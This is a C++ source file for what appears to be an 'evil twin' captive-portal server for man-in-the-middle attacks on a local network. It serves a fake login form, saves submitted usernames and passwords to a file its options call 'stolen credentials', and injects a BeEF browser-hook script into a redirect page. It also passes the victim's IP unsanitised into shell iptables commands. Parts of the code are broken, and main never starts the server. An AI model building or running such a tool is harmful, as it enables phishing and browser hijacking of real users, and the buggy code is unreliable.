#include </usr/include/stdio.h>
#include <boost/program_options.hpp>
#include <string>
#include <algorithm>
#include <iostream>
#include <fstream>
#include <iterator>
#include <boost/algorithm/string.hpp>
#include <boost/filesystem.hpp>
//#include "include/boost/process.hpp"
#include <cstdlib>
#include <bits/stdc++.h>
#include <stdlib.h>
#include <boost/asio/ip/address.hpp>
#include <boost/network/uri.hpp>
//libhttpserver for debian
#include <httpserver.hpp>
//g++ -L/usr/include/boost/program_options.hpp ./main.cpp -o ./main.o -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lboost_process -lboost_network
//namespace process = boost::process;
using namespace std;
using namespace httpserver;

namespace addr       = boost::asio::ip;
namespace filesystem = boost::filesystem;
namespace options    = boost::program_options;
namespace url_parse  = boost::network::uri;


bool hook;
int PORT;
std::string  credentials_file;
//std::vector[] username_password_pair;
//std::string username_password_array[];

std::string document_root;
std::vector<string> hostslist;
std::string html_redirect_body;

void make_html(std::string hook_location, std::string formaction){
    std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
    std::string html_form_body_top = "<body><form class=\"login\" action=\"";
    std::string form_action = formaction;
    std::string html_form_body_bottom = "\" method=\"post\">\
        <input type=\"text\" name=\"username\" value=\"username\">\
        <input type=\"text\" name=\"password\" value=\"password\">\
        <input type=\"submit\" name=\"submit\" value=\"submit\">\
        </form>\
        </body>\
        </html>";
    std::string html_redirect_head = "<html><head><script src=";
    std::string beef_hook = hook_location;
    std::string html_redirect_middle = "></script><meta http-equiv=\"refresh\" content=\"0; url=";
    std::string redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
    html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;

};

int parse_commandline(int argc, char* argv[]){
    options::options_description desc("Captive portal server, very insecure and not for beginners, if you have a problem, solve it. If you get hacked while using this, too bad");
    desc.add_options()
        ("help,h", "Print Help Message" )
        ("address,a", options::value<std::string >()->default_value("192.168.0.1"), "IP address to use (this is the router on the LAN, Were doing an MITM!)" )
        ("port,p", options::value<int>()->default_value(80), "port to serve the portal on")
        ("Iface,i", options::value< std::string >()->default_value("eth0"), "Interface to use, must be capable of monitor mode." )
        ("beef-hook,b", options::value< std::string >()->default_value("false"), "Trigger for beef" )
        ("credentials,c", options::value<std::string>()->default_value("credentials.txt"), "Filename to save the stolen credentials to")
        ("external-html,e", options::value<std::string>()->default_value("false"), "switch for serving external document instead of internal form. type 'true' OR NOTHING")
        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server if using an external html")

    ;
    options::variables_map arguments;
    options::store(options::parse_command_line(argc , argv, desc), arguments);
    try {
        options::notify(arguments);
    } catch (std::exception& e) {
        std::cerr << "ERROR: " << e.what() << "\n";
        return 1;
    };
    if (arguments.count("help")) {
        cout << desc << "\n";
        return 1;
    };
    if (arguments.count("beef-hook") == 'true') {
        hook = true;
    } else {
        hook = false;
    };
    document_root = arguments["document-root"].as<std::string>();
    std::string arg_addr = arguments["address"].as<std::string>();
    const boost::asio::ip::address_v4 addr = boost::asio::ip::address_v4::from_string(arg_addr);
    credentials_file = arguments["credentials"].as<std::string>();
    PORT = arguments["port"].as<int>();
};

class CaptivePortal : public http_resource {
public:
    const std::shared_ptr<http_response> render_POST(const http_request& request) {
        authpassthrough(request.get_requestor());
        save_credentials(request.get_user(), request.get_pass());

        return std::shared_ptr<http_response>(new string_response("Hello, World!"));
    }

    void authpassthrough(std::string remote_ip){
        std::string ipt1 = "iptables -t nat -I PREROUTING 1 -s " + remote_ip + " -j ACCEPT";
        std::string ipt2 = "iptables -I FORWARD -s " + remote_ip + "-j ACCEPT";
        const char *iptsyscall1 = ipt1.c_str();
        const char *iptsyscall2 = ipt2.c_str();
        system(ipt1.c_str());
        system(ipt2.c_str());
        //^^^^WHY DOES IT NOT COMPILE IF I DONT DO THIS?!?!?!
    //self.wfile.write("You are now authorized. Navigate to any URL")
    };
    int save_credentials(std::string username, std::string password){
        try {
            std::string name = username;
            std::string pass = password;
            auto pwd = filesystem::current_path().string();
            std::string file = pwd + credentials_file;
            std::ofstream credentials(file);
            std::string data(name + " : " + pass + "\n");
            credentials << data;
            return 0;
        } catch (std::exception& e) {
            std::cerr << "ERROR: " << e.what() << "\n";
            return 1;
        };
    };

};

void start_server(){
    webserver server = create_webserver(PORT);
    CaptivePortal captiveportal;
    server.register_resource(document_root, &captiveportal);
    server.start(true);
};
int main(int argc, char* argv[]) {
    auto pwd = filesystem::current_path();
    cout << pwd << "\n";
    parse_commandline(argc, argv);

};
















